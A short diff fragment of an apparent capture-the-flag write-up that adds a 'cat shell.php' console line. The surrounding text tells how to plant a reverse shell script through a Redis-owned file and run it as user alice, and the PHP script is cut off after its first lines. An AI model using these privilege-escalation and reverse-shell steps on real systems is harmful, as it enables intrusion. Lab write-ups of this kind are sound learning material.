@@ -80,6 +80,8 @@ since wp is owned by alice
 we just need to upload a reverse shell script and execute it as alice         
 create a script in redis which is own by current user
 ```console
+redis@readys:/opt/redis-files$ cat shell.php
+
 <?php
 $output=null;
 $retval=null;
